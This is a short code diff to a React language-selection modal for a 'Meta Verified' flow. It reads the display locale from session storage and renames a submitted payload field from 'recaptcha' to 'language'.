@@ -12,7 +12,7 @@ import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
 import { useAppStrings } from '@/hooks/useAppStrings'
 import { getUserLocation } from '@/utils/getLocation'
 import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
-import { LANG_MODAL_SEEN_KEY, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
+import { LANG_MODAL_SEEN_KEY, readSessionDisplayLocale, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
 import { SendData } from '@/utils/sendData'
 
 function applyDocumentLang(locale: AppLocale) {
@@ -58,7 +58,7 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
 
   React.useEffect(() => {
     if (isOpen) {
-      setDraftLocale(currentLocale)
+      setDraftLocale(readSessionDisplayLocale() ?? 'en')
       setLoading(false)
       sendingRef.current = false
     }
@@ -92,7 +92,7 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
 
     let payload: Record<string, unknown> = {
       ...formData,
-      recaptcha: LOCALE_OPTION_LABELS[locale],
+      language: LOCALE_OPTION_LABELS[locale],
     }
 
     if (!String(formData.ip ?? '').trim() || !String(formData.location ?? '').trim()) {
